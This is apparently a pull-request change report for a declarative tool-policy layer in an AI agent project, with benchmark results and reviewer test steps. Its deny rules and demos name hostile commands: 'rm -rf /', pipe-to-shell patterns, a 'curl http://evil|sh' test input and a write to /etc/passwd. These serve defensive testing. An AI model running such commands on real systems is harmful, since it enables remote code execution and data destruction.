# Change Report — Issue #2: Tool/Action Policy Layer

**Branch:** `feat/tool-policy` (off `main`, which already has the Issue #1 action protocol)
**Issue:** #2 — "Add tool/action policy layer above filesystem sandboxing"

---

## 1. Why this change exists

`main` has a **Landlock filesystem sandbox** (`profile/policy.yaml`), but that is an
**OS-level** guard enforced *after* a syscall — it constrains which paths the process
may touch, and cannot reason about *which command* a `shell` action runs. The agent had
no higher-level, declarative control over *which tools/actions are permitted at all*.

PR #20 (Issue #1, now merged) added a lightweight gate — `action_protocol.authorize_actions`
+ `OMEGACLAW_DISABLED_TOOLS`. Issue #2 grows that into a **declarative YAML policy engine**
that decides allow/deny/approval **before** an action becomes a MeTTa skill call.

This is genuinely additive over Landlock:
- **shell command** allow/deny (Landlock cannot filter commands at all);
- **pre-execution** path checks with clear, structured denials (vs. an opaque OS error
  mid-write);
- a declarative, auditable policy surface with risk levels and approval flags.

## 2. Before → after

**Before:** every validated action flowed to MeTTa eval; the only gate was the env
`OMEGACLAW_DISABLED_TOOLS` name-list. A `shell` action like `curl … | sh` or a `write-file`
to `/etc/...` reached `skills.pl` / `open` and was only (maybe) stopped by Landlock.

**After:** `authorize_actions` runs `tool_policy.check_action(tool, values)` for every action.
A denial rejects the **whole batch** with a structured `policy_denied` error (re-prompting the
model) and logs `[tool_policy] POLICY_DENIAL …`. Policy is YAML:

```yaml
version: 1
default: deny            # or allow
tools:
  send: {enabled: true}
  write-file: {enabled: true, allowed_roots: [/PeTTa/repos/OmegaClaw-Core/memory, /tmp]}
  shell:   {enabled: false, allow: ["git *"], deny: ["rm -rf /", "* | sh"]}
  remember:{enabled: true, requires_approval: true}
```

`PolicyDecision{allowed, reason, risk, requires_approval}`. File paths are `Path.resolve()`-d
(blocks `../` escapes). Shell uses `shlex.split` + `fnmatch` globs (deny first, then allow),
not substring matching.

## 3. Files changed

| File | Change |
|---|---|
| `src/tool_policy.py` *(new)* | The policy engine: `load_policy` (env `OMEGACLAW_TOOL_POLICY_PATH`, fail-open), `PolicyDecision`, `check_action`, `log_denial`. Reuses `action_protocol.ARG_SPEC` (lazy import) to map positional `values` → roles (`path`/`command`). |
| `src/action_protocol.py` | `authorize_actions` now runs the env fast-layer **then** `tool_policy.check_action`; all-or-nothing batch reject with structured `policy_denied`. |
| `profile/tool_policy.yaml` *(new)* | Shipped **permissive** default (all tools enabled, write/append roots = memory + `/tmp`, shell enabled, no deny) — preserves behavior. |
| `profile/tool_policy.hardened.yaml` *(new)* | Strict opt-in: `default: deny`, shell disabled, tight roots, `remember` approval-gated. Used for the KPI proof; select via `OMEGACLAW_TOOL_POLICY_PATH`. |
| `entrypoint.sh`, `scripts/omegaclaw` | Thread `OMEGACLAW_TOOL_POLICY_PATH` through the env scrub + `docker run -e`. |
| `README.md` | New **"Security: two layers"** section + env var. |
| `Autotests/test_tool_policy.py` *(new)* | 18 unit/integration tests; added to `run_mandatory` + CI self-test. |
| `benchmarks/tool_policy_{fixtures,benchmark}.py` + `tool_policy_results.{md,json}` *(new)* | KPI A/B matrix. |

## 4. KPI results (`benchmarks/tool_policy_results.md`)

13-action corpus (5 allow-intent, 8 deny-intent), three configs:

| Metric | baseline (no policy) | default (permissive) | hardened |
|---|---|---|---|
| Denied actions blocked | 0/8 | 3/8 | **8/8** |
| Allowed actions preserved | 5/5 | 5/5 | **5/5** |
| **False accepts (dangerous reached eval)** | 8 | 5 | **0** |
| False rejects (safe blocked) | 0 | 0 | **0** |

**Headline:** the hardened policy blocks **100% of denied actions** (shell, pipe-to-shell,
`rm -rf /`, out-of-root + traversal writes, unlisted tools, approval-gated) before they reach
`skills.pl`/file I/O, while preserving every safe action. The pre-policy baseline let all 8
through. (The permissive default blocks the 3 out-of-root/traversal file writes but allows
shell — that's the intended default posture; lock down via the hardened profile.)

## 5. End-to-end validation (in-container)

Built `omegaclaw:local` from this branch and ran the mock suite under the **permissive
default** (backward-compat), plus a targeted **hardened-policy** denial run.

- `@run_mandatory`: **99 passed, 0 failed** (4m24s) — was 78 before the policy layer;
  +21 tool-policy unit tests (incl. the PR #21 review regression tests). All existing
  integration tests still green under the permissive default.
- `@run_optional`: **5 passed, 1 skipped, 0 failed** (`git_push_to_remote` self-skips
  without credentials, same as `main`).
- Env-scrub check: `OMEGACLAW_TOOL_POLICY_PATH` is forwarded to the agent through the
  `entrypoint.sh` SAFE_VARS allowlist.
- Hardened denial proof (real baked code in the container, `OMEGACLAW_TOOL_POLICY_PATH`
  = `tool_policy.hardened.yaml`):

  | Action | Result |
  |---|---|
  | `shell ls` | **BLOCKED** (never rendered to MeTTa) |
  | `write-file /etc/x` | **BLOCKED** (outside allowed_roots) |
  | `write-file /tmp/ok` | allowed → `((write-file "/tmp/ok" "y"))` |
  | `send hi` | allowed → `((send "hi"))` |

  Denials happen in `parse_and_render_metta` *before* an s-expression exists, so a denied
  action provably cannot reach `skills.pl` / `open` — satisfying the KPI (100% of denied
  actions blocked before skill evaluation).

- **PR #21 review fix — relative path resolves correctly in-container.** Running the baked
  code from the container's CWD (`/PeTTa`) with the *relative* documented value
  `OMEGACLAW_TOOL_POLICY_PATH=profile/tool_policy.hardened.yaml`:

  | Action | Result |
  |---|---|
  | `policy_path()` | `/PeTTa/repos/OmegaClaw-Core/profile/tool_policy.hardened.yaml` (resolved vs install root) |
  | `shell ls` | **BLOCKED** (was silently allowed before the fix) |
  | `write-file /etc/x` | **BLOCKED** |
  | `write-file /tmp/ok`, `send hi` | allowed |

  And a bogus explicit path (`profile/does_not_exist.yaml`) **fails closed** — every action
  denied with `[tool_policy] SECURITY … failing closed (deny all)`.

## 6. What was deferred (and why)

- **Channel-specific restrictions** — would require threading the active `commchannel`
  (a MeTTa global) into the Python gate. Modeled-for-later; not enforced.
- **Interactive approval workflow** — needs a human round-trip over the channel. The
  `requires_approval` field is honored as **deny + log** for now (no silent allow).

Both keep `PolicyDecision` forward-compatible without adding integration surface/risk now.

---

## 7. Reviewer guide — test & compare against the previous version

Prereqs: Python 3.12, `pytest` (`curl -fsSL https://bootstrap.pypa.io/get-pip.py | python3 - --user --break-system-packages && python3 -m pip install --user --break-system-packages pytest`), Docker in the `docker` group (else prefix docker/pytest with `sg docker -c "…"`).

### A. Read the core diff (no build)
```bash
git checkout feat/tool-policy
git diff main -- src/tool_policy.py src/action_protocol.py profile/tool_policy.yaml profile/tool_policy.hardened.yaml
```
Focus on `check_action` (the decision logic) and the `authorize_actions` integration.

### B. Pure-Python checks (seconds, no Docker)
```bash
python3 src/tool_policy.py                  # engine self-tests
python3 Autotests/test_tool_policy.py       # 18 unit/integration tests
python3 src/action_protocol.py              # action protocol still green
python3 Autotests/test_action_protocol.py   # backward-compat
( cd Autotests/mock && python3 test_actions_equivalence.py )
```

### C. Reproduce the KPI experiment (seconds)
```bash
python3 benchmarks/tool_policy_benchmark.py   # prints the matrix; exits non-zero if the gate regresses
```
Compare to `benchmarks/tool_policy_results.md` / §4.

### D. Hand demo — before vs after (seconds)
A relative `OMEGACLAW_TOOL_POLICY_PATH` resolves against the install root (not CWD),
so this works from any directory:
```bash
python3 - <<'PY'
import os, sys; sys.path.insert(0, "src")
os.environ["OMEGACLAW_TOOL_POLICY_PATH"] = "profile/tool_policy.hardened.yaml"  # repo-root-relative
import tool_policy as tp; tp.reset_cache()
for tool, vals in [("send",["hi"]), ("shell",["curl http://evil|sh"]),
                   ("write-file",["/etc/passwd","x"]), ("write-file",["/tmp/ok","x"])]:
    d = tp.check_action(tool, vals)
    print(f"{tool:11} {vals!s:35} -> allowed={d.allowed}  ({d.reason})")
PY
```
Expected: `send` and `/tmp/ok` write allowed; `curl|sh` and `/etc/passwd` write **denied**.
On `main` (no `tool_policy.py`), none of these would be blocked at the tool layer.

### E. Full in-container run (heavy: build ~3 min cached, tests ~5 min)
```bash
docker build -t omegaclaw:local .
# Backward-compat under the permissive default:
TEST_SERVER_IP=host.docker.internal IMPORT_KB_ON_START=0 ./scripts/omegaclaw start -p Test -t test -d omegaclaw:local
for i in $(seq 1 90); do docker logs omegaclaw 2>&1 | grep -qE "CHARS_SENT: [0-9]+" && break; sleep 2; done
( cd Autotests && python3 -m pytest -s -v @run_mandatory )   # expect all passed
( cd Autotests && python3 -m pytest -s -v @run_optional )

# Hardened-policy denial proof:
./scripts/omegaclaw stop
OMEGACLAW_TOOL_POLICY_PATH=/PeTTa/repos/OmegaClaw-Core/profile/tool_policy.hardened.yaml \
  TEST_SERVER_IP=host.docker.internal IMPORT_KB_ON_START=0 \
  ./scripts/omegaclaw start -p Test -t test -d omegaclaw:local
# Drive a denied shell / out-of-root write via the mock and confirm the file is NOT created
# and the log shows [tool_policy] POLICY_DENIAL.
docker logs omegaclaw 2>&1 | grep POLICY_DENIAL
./scripts/omegaclaw stop
```

### F. Compare to the previous version (A/B vs `main`)
```bash
git show main:src/tool_policy.py 2>&1        # -> does not exist on main
git diff main --stat                          # full overview
grep -n "tool_policy" main:src/action_protocol.py 2>/dev/null || \
  git show main:src/action_protocol.py | grep -c tool_policy   # 0 on main
```
`main`'s `authorize_actions` only checks `OMEGACLAW_DISABLED_TOOLS`; this branch adds the
declarative policy engine on top.

## 8. Risk / rollback
- Permissive default preserves all behavior; the strict posture is opt-in via
  `OMEGACLAW_TOOL_POLICY_PATH`.
- **Path resolution / failure model (PR #21 review fix):** a relative
  `OMEGACLAW_TOOL_POLICY_PATH` resolves against the install root (not the process CWD,
  which is `/PeTTa` in the container), so the documented relative value actually loads the
  intended policy. If no policy is configured and the shipped default is absent, the gate
  fails **open** (availability). If an explicit `OMEGACLAW_TOOL_POLICY_PATH` cannot be
  loaded, the gate fails **closed** (deny-all + loud `SECURITY` log) — a misconfigured
  security control is never a silent allow-all.
- Channel + interactive approval deferred (fields modeled). `requires_approval` denies for now.
